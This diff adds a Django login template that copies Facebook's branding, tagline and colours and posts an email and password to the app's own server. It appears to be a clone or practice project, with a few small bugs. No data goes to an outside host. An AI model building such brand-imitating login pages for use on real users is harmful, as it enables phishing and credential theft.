@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Log in — Social</title>
+<style>
+:root{--fb:#1877f2;--bg:#f0f2f5;--card:#fff;--muted:#65676b}
+*{box-sizing:border-box}
+body{margin:0;font-family:Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);display:flex;align-items:center;justify-content:center;height:100vh}
+.wrap{width:100%;max-width:980px;display:flex;gap:48px;padding:24px}
+.brand{flex:1;display:flex;flex-direction:column;justify-content:center}
+.brand h1{color:var(--fb);font-size:48px;margin:0 0 8px}
+.brand p{color:var(--muted);font-size:20px;margin:0}
+.card{width:360px;background:var(--card);padding:20px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,.08)}
+.card form{display:flex;flex-direction:column;gap:10px}
+input{padding:14px;border-radius:6px;border:1px solid #ccd0d5;font-size:15px}
+button.primary{background:var(--fb);color:#fff;border:0;padding:12px;border-radius:6px;font-weight:600;cursor:pointer}
+.link{background:transparent;border:0;color:var(--fb);padding:10px;border-radius:6px;cursor:pointer}
+.small{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
+@media (max-width:800px){.wrap{flex-direction:column;align-items:center}}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="brand">
+<h1>facebook</h1>
+<p>Facebook helps you connect and share with the people in your life.</p>
+</div>
+
+<div class="card">
+<form id="loginForm" method="POST" autocomplete="on">
+    {% csrf_token %}
+    <input type="text" id="email" name="email" placeholder="Email or phone" required>
+    <input type="password" id="password" name="password" placeholder="Password" required>
+    <button class="primary" type="submit">Log In</button>
+  
+    <div class="small"><a href="{% url 'signup' %}" style="color:rgb(44, 18, 130);">Creat an Account</a>
+    {% if messages %}
+        <div style="color:red; margin-top:10px;">
+            {% for message in messages %}
+                {{ message }}
+            {% endfor %}
+        </div>
+    {% endif %}
+</form>
+</div>
+</div>
+
+<script>
+document.getElementById('facebookBtn').addEventListener('click', ()=>{
+    window.location.href = '/auth/facebook';
+});
+</script>
+</body>
+</html>
